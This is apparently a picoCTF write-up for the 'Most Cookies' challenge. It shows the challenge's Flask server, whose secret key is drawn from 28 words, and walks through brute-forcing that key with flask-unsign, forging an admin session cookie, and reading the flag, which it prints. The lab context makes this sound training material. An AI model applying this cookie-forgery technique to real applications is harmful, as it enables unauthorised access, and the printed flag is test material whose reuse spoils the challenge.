# Most Cookies

## Challenge Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:18835/

## Hint

How secure is a flask cookie?

## Solution

<img width="1718" height="828" alt="image" src="https://github.com/user-attachments/assets/b75ea1d8-efe2-444d-a05d-d79cacc2e987" />

I tried various inputs to see what happens and saw that when a valid cookie name is entered, the message "That is a cookie! Not very special though...' is shown. For any other input, "That doesn't appear to be a valid cookie." is shown

Now let's take a look at the given code

```bash
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```

Flask uses client-side sessions signed with the secret key, which in this case is randomly chosen from the 28 cookie names. We can see that to get the flag, we need `session["very_auth"] == "admin"` and the `/search` endpoint only accepts valid cookie names in which "admin" isn't there. So I'll have to forge a new session cookie with `very_auth = "admin"`

Flask sessions are signed not encrypted, which means anyone can read the session data, but only someone with the secret key can modify it. Since there are only 28 possible secret keys, I can brute force them and find the correct one by validating the signature. For that, first I created a file `cookies.txt` with all 28 cookie names

```bash
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

Then I copied the current cookie session value and used `flask-unsign` to brute force

<img width="1914" height="864" alt="image" src="https://github.com/user-attachments/assets/4025b356-cc19-48b5-8ed0-6dd997329cd5" />

```bash
# flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aPQyng.smEuf6Wzpse-A09UeBC8IK8qKxI' --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```
Now that we have the secret key, let's create a forged session

```bash
# flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aPQ0OQ.fVCqkV1KVUaqRI2osY_j9JS7r9k
```

I updated the cookie value and got the flag

<img width="1919" height="853" alt="image" src="https://github.com/user-attachments/assets/fe5b55af-d2d7-4cc3-8ca5-47c864dc7753" />

Thus the flag for this challenge is `picoCTF{pwn_4ll_th3_cook1E5_743c20eb}`

